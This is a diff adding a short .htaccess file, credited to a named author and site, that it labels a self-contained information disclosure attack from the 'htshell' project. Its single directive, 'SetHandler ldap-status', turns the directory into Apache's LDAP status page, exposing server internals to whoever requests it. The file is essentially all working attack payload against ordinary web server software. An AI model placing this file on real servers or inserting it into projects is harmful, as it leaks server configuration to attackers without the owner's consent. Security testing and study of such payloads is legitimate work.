@@ -1,0 +1,5 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id 
+
+# Self contained .htaccess information disclosure attack - Part of the htshell project.
+
+SetHandler ldap-status
